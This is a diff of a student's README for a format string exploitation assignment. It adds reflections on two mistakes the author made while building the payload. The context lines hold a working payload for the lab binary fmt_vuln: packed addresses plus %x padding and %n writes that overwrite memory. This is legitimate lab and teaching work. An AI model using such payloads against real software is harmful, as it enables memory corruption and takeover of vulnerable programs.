@@ -5,8 +5,14 @@ David Luo
 ```
 ./fmt_vuln $(printf "\x30\xa0\x04\x08____\x31\xa0\x04\x08____\x32\xa0\x04\x08____\x33\xa0\x04\x08")%x%x%x%x%x%x%x%x%x%180x%n%207x%n%239x%n%305x%n
 ```
+## My experience
 
-## Steps:
+Overall I feel that this assigment was pretty managable once I got over a few hurdles.
+The first was realizing that I forgot to increase the memory addresses for `test_val` in my payload.
+The second was using a value `0x100` greater than the value I was trying to obtain to do the math for how many buffer bytes
+I needed.
+
+## Steps
 
 1. Find location of format string.
     ```
